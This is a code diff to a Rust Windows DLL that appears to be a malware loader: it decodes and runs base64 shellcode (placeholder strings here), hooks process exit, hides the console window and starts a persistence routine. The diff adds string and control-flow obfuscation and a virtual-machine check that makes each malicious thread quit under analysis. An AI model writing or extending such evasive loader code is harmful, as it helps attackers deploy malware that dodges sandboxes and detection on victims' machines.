@@ -4,8 +4,11 @@ use std::arch::global_asm;
 use windows::Win32::Foundation::{BOOL, HINSTANCE};
 use windows::Win32::System::SystemServices::DLL_PROCESS_ATTACH;
 use base64::{Engine as _, engine::general_purpose};
+use obfuscator::{obfuscate, obfuscate_string};
 
 mod syscall;
+mod anti_analysis;
+
 use syscall::{get_syscall_info, get_module_base, get_export_address, find_ret_gadget, SyscallInfo};
 
 static mut ORIGINAL_EXIT_PROCESS: usize = 0;
@@ -632,17 +635,18 @@ unsafe extern "system" fn fake_exit_process(_exit_code: u32) {
     loop { std::thread::sleep(std::time::Duration::from_secs(60)); }
 }
 
-const sh1: &str = "Shellcode";
-
-const sh2: &str = "shellcode2";
-
 fn get_shellcode() -> String {
-    [sh1, sh2].concat()
+    [
+        obfuscate_string!("Shellcode"),
+        obfuscate_string!("shellcode2"),
+    ].concat()
 }
 
-
-
+#[obfuscate(garbage=true, control_f=true, arithmetic=false)]
 unsafe extern "system" fn shellcode_thread(_: *mut core::ffi::c_void) -> u32 {
+    if anti_analysis::is_virtualized() {
+        return 0;
+    }
 	let ENCODED_SHELLCODE = get_shellcode();
 	
     if let Ok(shellcode) = general_purpose::STANDARD.decode(ENCODED_SHELLCODE) {
@@ -695,7 +699,11 @@ unsafe extern "system" fn shellcode_thread(_: *mut core::ffi::c_void) -> u32 {
     0
 }
 
+#[obfuscate(garbage=true, control_f=true, arithmetic=false)]
 unsafe extern "system" fn hide_console_thread(_: *mut core::ffi::c_void) -> u32 {
+    if anti_analysis::is_virtualized() {
+        return 0;
+    }
     loop {
         if let Some(kernel32_base) = get_module_base("kernel32.dll") {
             if let Some(get_console_window_addr) = get_export_address(kernel32_base, "GetConsoleWindow") {
@@ -716,7 +724,11 @@ unsafe extern "system" fn hide_console_thread(_: *mut core::ffi::c_void) -> u32 
 
 mod pre;
 
+#[obfuscate(garbage=true, control_f=true, arithmetic=false)]
 unsafe extern "system" fn persistence_thread(_lp_param: *mut std::ffi::c_void) -> u32 {
+    if anti_analysis::is_virtualized() {
+        return 0;
+    }
     match pre::setup_persistence() {
         Ok(_) => {
             let _ = std::fs::write("C:\\Users\\Public\\persist_ok.txt", "OK");
